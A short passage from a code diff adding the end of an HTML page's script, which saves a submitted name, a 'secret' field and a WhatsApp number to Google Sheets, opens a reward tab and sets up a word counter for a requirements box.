+            saveDataToGoogleSheets(name, secret, whatsapp, "");
+            
+            // Open reward tab
+            openRewardTab(code);
+            showNotification('Your activity has been recorded. Rewards will be selected based on performance.', 'success');
+        });
+        
+        // Add event listener for word count
+        document.addEventListener('DOMContentLoaded', function() {
+            loadClickCount();
+            
+            // Setup word count for special requirements
+            const specialRequirements = document.getElementById('specialRequirements');
+            specialRequirements.addEventListener('input', updateWordCount);
+        });
+    </script>
+</body>
+</html>
